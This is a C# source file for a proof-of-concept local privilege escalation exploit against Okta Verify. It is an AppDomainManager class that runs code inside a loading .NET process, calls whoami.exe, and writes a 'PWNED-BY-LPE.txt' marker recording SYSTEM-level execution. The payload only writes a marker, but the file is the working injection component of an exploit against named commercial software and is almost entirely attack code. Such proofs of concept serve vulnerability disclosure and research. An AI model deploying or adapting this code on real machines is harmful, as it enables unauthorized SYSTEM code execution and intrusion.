using System;
using System.IO;
using System.Diagnostics;
using System.Reflection;

[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]

namespace OktaLPE
{
    public class LPEManager : AppDomainManager
    {
        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
        {
            try
            {
                string marker = @"C:\ProgramData\Okta\PWNED-BY-LPE.txt";
                string whoami = "unknown";
                try
                {
                    var psi = new ProcessStartInfo("whoami.exe")
                    {
                        RedirectStandardOutput = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };
                    var p = Process.Start(psi);
                    whoami = p.StandardOutput.ReadToEnd().Trim();
                    p.WaitForExit(5000);
                }
                catch { }

                File.WriteAllText(marker, string.Format(
                    "Okta Verify LPE PoC - SYSTEM Code Execution\r\n" +
                    "Running as: {0}\r\n" +
                    "Process: {1} (PID {2})\r\n" +
                    "Time: {3}\r\n" +
                    "Machine: {4}\r\n" +
                    "Assembly: {5}\r\n",
                    whoami,
                    Process.GetCurrentProcess().ProcessName,
                    Process.GetCurrentProcess().Id,
                    DateTime.Now.ToString("o"),
                    Environment.MachineName,
                    Assembly.GetExecutingAssembly().Location));
            }
            catch { }
            base.InitializeNewDomain(appDomainInfo);
        }
    }
}
